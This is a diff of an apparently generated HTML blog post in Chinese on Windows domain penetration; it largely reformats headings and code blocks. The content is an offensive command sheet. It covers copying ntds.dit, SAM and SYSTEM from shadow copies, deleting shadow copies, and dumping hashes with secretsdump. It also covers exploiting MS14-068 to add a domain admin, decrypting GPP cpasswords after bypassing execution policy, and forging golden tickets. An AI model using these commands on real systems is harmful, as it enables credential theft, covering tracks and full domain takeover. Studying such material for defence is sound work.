@@ -764,8 +829,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy47\windows\system32\config\sa
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin delete shadows /for=c: /quiet
 </code></pre></div></div>
 
-<p>获取
-将以上system，sam, ntds.dit 放到 /root/ntds_cracking/下，运行</p>
+<p>获取将以上system，sam, ntds.dit 放到 /root/ntds_cracking/下，运行</p>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/SYSTEM LOCAL -outputfile  hash.txt
 </code></pre></div></div>
@@ -778,10 +842,10 @@ python setup.py  install
 </code></pre></div></div>
 
 <p>py地址 https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py
-参考：
-<a href="http://www.4hou.com/technology/10573.html">域渗透——获得域控服务器的NTDS.dit文件</a></p>
+参考：<a href="http://www.4hou.com/technology/10573.html">域渗透——获得域控服务器的NTDS.dit文件</a></p>
 
 <h4 id="dc定位">dc定位</h4>
+<hr />
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nltest dclist:xx.xx
 net time /domain
@@ -795,10 +859,12 @@ PowerView Get-NetDomainController
 PowerView地址https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
 </code></pre></div></div>
 
-<h3 id="windows-log">windows log</h3>
+<h2 id="windows-log">windows log</h2>
+<hr />
 <p>微软第三方信息收集工具LogParser.exe psloglist.exe等</p>
 
 <h2 id="powerhsell神器">powerhsell神器</h2>
+<hr />
 <p>nishang
 https://github.com/samratashok/nishang</p>
 
@@ -811,7 +877,8 @@ https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</p>
 <p>针对ps的Empire
 https://github.com/EmpireProject/Empire</p>
 
-<h3 id="ms14-068-kerberos漏洞利用">ms14-068 Kerberos漏洞利用：</h3>
+<h2 id="ms14-068-kerberos漏洞利用">ms14-068 Kerberos漏洞利用：</h2>
+<hr />
 <p>生成TGT：用于伪造</p>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whoami /all
@@ -834,7 +901,8 @@ net user admin xxxxx@password /add /domain
 net group "Domain Admins" admin /add /domain msf ms14_048_kerberos_checksum模块也可以检测 工具： https://www.t00ls.net/viewthread.php?tid=28207&amp;from=favorites https://github.com/gentilkiwi/kekeo
 </code></pre></div></div>
 
-<h3 id="gpp漏洞利用">GPP漏洞利用</h3>
+<h2 id="gpp漏洞利用">GPP漏洞利用</h2>
+<hr />
 <p>win2008增加，一般域用户都可访问敏感文件<br />
 密码存在SYSCOL目录下:</p>
 
@@ -843,9 +911,17 @@ Services\Services.xml,
 ScheduledTasks\ScheduledTasks.xml,
 Printers\Printers.xml,
 Drives\Drives.xml,
-DataSources\DataSources.xml ``` net use \\域控(如pc.xx.com) password /user:xxx.com\username  dir \\域控\SYSVOL /s /a &gt; sysvol.txt findstr /i "groups.xml" sysvol.txt ``` 找到cpassword   解密过程：
+DataSources\DataSources.xml
+</code></pre></div></div>
 
-set-executionPolicy bypass
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net use \\域控(如pc.xx.com) password /user:xxx.com\username 
+dir \\域控\SYSVOL /s /a &gt; sysvol.txt
+findstr /i "groups.xml" sysvol.txt
+</code></pre></div></div>
+<p>找到cpassword<br />
+解密过程：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set-executionPolicy bypass
 powershell -ep bypass     启动ps
 Import-Module .\GPP.ps1
 Get-DecryptedCpassword  xxxxxxxxxxxxxx
@@ -856,7 +932,8 @@ https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPP
 
 <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">利用SYSVOL还原组策略中保存的密码</a></p>
 
-<h3 id="黄金票据维权">黄金票据(维权)</h3>
+<h2 id="黄金票据维权">黄金票据(维权)</h2>
+<hr />
 
 <p>域用户sid</p>
 
@@ -878,10 +955,12 @@ net group “domain admins” /domain
 "kerberos::tgt"
 </code></pre></div></div>
 
-<h2 id="总结">总结</h2>
-<p>​        首先，利用 webshell 执行开篇的命令收集内网前期信息(不局限用 webshell)，也可以用 msf 等平台，或 powershell 收集信息，判断机器所处区域，是 DMZ 区，还是办公区，核心 DB等;机器作用是文件服务器，Web，测试服务器，代理服务，还是 DNS，DB 等;网络连通性，文中也提到测试 dns，tcp，http 等命令，理清内网拓扑图，网段，扫描内网，路由，交换机，端口等判断是域还是组，组的话，用常见 web 方法，域的话 gpp，kerberos，黄金白银票据，抓密码，这里注意密码有的有空格，pth，ptk,spn 扫描，ipc,445,web 漏洞，各种未授权，密码相同,历史命令等，期间会遇到提权，bypass uac，bypass av。</p>
+<h1 id="总结">总结</h1>
+<hr />
+<p>​   首先，利用 webshell 执行开篇的命令收集内网前期信息(不局限用 webshell)，也可以用 msf 等平台，或 powershell 收集信息，判断机器所处区域，是 DMZ 区，还是办公区，核心 DB等;机器作用是文件服务器，Web，测试服务器，代理服务，还是 DNS，DB 等;网络连通性，文中也提到测试 dns，tcp，http 等命令，理清内网拓扑图，网段，扫描内网，路由，交换机，端口等判断是域还是组，组的话，用常见 web 方法，域的话 gpp，kerberos，黄金白银票据，抓密码，这里注意密码有的有空格，pth，ptk,spn 扫描，ipc,445,web 漏洞，各种未授权，密码相同,历史命令等，期间会遇到提权，bypass uac，bypass av。</p>
 
-<h3 id="某些大佬语录">某些大佬语录</h3>
+<h2 id="某些大佬语录">某些大佬语录</h2>
+<hr />
 <p>利用漏洞配置不当获取更多主机权限<br />
 常见应用漏洞：<br />
 struts2、zabbix、axis、ImageMagic、fastcgi、Shellshock、redis 未授权访问、Hadoop、weblogic、jboss、WebSphere、Coldfusion<br />
